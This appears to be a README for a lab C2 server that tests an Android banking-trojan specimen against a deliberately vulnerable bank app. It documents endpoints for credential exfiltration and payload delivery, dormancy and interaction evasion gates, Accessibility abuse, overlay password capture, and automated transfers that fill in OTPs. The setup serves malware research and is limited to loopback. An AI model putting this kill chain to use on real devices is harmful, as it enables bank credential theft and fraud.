# Lab C2 Server

Loopback-only C2 for end-to-end specimen testing.

## Quick Start

```bash
# Basic — beacon + config, no payload
python server.py

# Full kill chain — payload + targets + ATS
python generate-test-payload.py --stub -o test-payload.bin
python server.py --payload test-payload.bin \
                 --targets "com.dvbank.example" \
                 --ats-file ats-dvbank-transfer.json
```

## Endpoints

| Method | Path | Purpose |
|---|---|---|
| POST | `/api/v1/beacon` | Device fingerprint + credential exfil |
| GET | `/api/v1/payload` | Encrypted DEX delivery |
| GET | `/api/v1/config` | Config: targets, ATS commands, kill switch |
| GET | `/status` | Operator dashboard (browser) |
| GET | `/credentials` | Dump all captured credentials (browser) |

## Emulator Setup

```bash
# 1. Start server on host
python server.py --targets "com.dvbank.example"

# 2. Install specimen on emulator
adb install app-debug.apk

# 3. Interact with app (10 taps to pass interaction gate)
#    Wait 30 seconds (dormancy gate)
#    Specimen beacons to 10.0.2.2:8080 (emulator → host loopback)

# 4. Grant Accessibility (Settings → Accessibility → SkyWeather)
# 5. Open DVBank on emulator → overlay fires
# 6. Watch credentials appear in server console
```

## Credential Log

All captured events written to `credentials.jsonl` (one JSON object per line):

```json
{"p":"com.dvbank.example","v":"overlay_password","x":"hunter2","t":1715000000000,"e":"overlay_pwd"}
```

## ATS Testing

```bash
# Stage ATS commands for DVBank transfer simulation
python server.py --targets "com.dvbank.example" --ats-file ats-dvbank-transfer.json
```

ATS command flow:
1. Specimen receives target list via `/config`
2. Specimen receives ATS commands via `/config`
3. User opens DVBank → AccessibilityEngine detects foreground
4. Overlay fires → captures credentials
5. ATS arms → waits for transfer screen
6. ATS auto-fills amount + beneficiary + OTP
7. ATS result exfils via `/beacon`

## Safety

- Server binds `127.0.0.1` only — hardcoded, not overridable
- No TLS needed (loopback traffic never leaves machine)
- Specimen validates RFC1918 on every network call
- Kill switch: `python server.py --kill` → specimen self-disables
